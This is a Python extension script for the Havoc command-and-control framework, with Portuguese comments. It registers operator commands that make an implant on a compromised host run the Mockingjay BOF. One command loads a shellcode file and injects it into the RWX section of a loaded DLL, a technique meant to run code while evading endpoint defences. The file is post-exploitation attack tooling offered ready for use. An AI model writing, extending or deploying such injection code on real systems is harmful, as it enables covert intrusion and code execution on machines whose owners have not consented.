from havoc import Demon, RegisterCommand

def mockingjay(demonID, *params):
    TaskID: str = None
    demon: Demon = Demon(demonID)
    packer = Packer()

    # Verifica se é x86 ou x64 e escolhe o BOF correto
    bof_path = f"bin/BOF_Mockingjay.{demon.ProcessArch}.o"

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked demon to execute BOF_Mockingjay")

    demon.InlineExecute(TaskID, "go", bof_path, packer.getbuffer(), False)

    return TaskID

RegisterCommand(mockingjay, "", "mockingjay", "Executes the Mockingjay BOF", 0, "", "")

# ---------------------------------------------------------- #

from havoc import Demon, RegisterCommand
import struct

def bof_mockingjay(demonID, *params):
    """
    Executa o BOF_Mockingjay para injetar código na seção RWX de uma DLL carregada.
    
    Uso:
        bofmockingjay <DLL_PATH> <SHELLCODE_FILE>
    
    Exemplo:
        bofmockingjay "C:\\Windows\\Temp\\example.dll" "shellcode.bin"
    """
    TaskID = None
    demon = Demon(demonID)

    if len(params) < 2:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Uso: bofmockingjay <DLL_PATH> <SHELLCODE_FILE>")
        return False

    dll_path = params[0]
    shellcode_file = params[1]

    try:
        with open(shellcode_file, "rb") as f:
            shellcode = f.read()
    except FileNotFoundError:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, f"Arquivo {shellcode_file} não encontrado.")
        return False

    demon.ConsoleWrite(demon.CONSOLE_INFO, f"Lendo {len(shellcode)} bytes do shellcode de {shellcode_file}")

    packed_params = struct.pack(f"{len(dll_path)}sI{len(shellcode)}s", dll_path.encode(), len(shellcode), shellcode)

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, f"Tasked demon to execute BOF_Mockingjay on {dll_path}")

    demon.InlineExecute(TaskID, "go", f"bin/BOF_Mockingjay.{demon.ProcessArch}.o", packed_params, False)

    return TaskID

# Registrar comando no Havoc
RegisterCommand(bof_mockingjay, "", "bofmockingjay", "Inject shellcode from a .bin file into RWX section of a DLL", 0, "<DLL_PATH> <SHELLCODE_FILE>", '"C:\\Caminho\\Para\\DLL.dll" "shellcode.bin"')
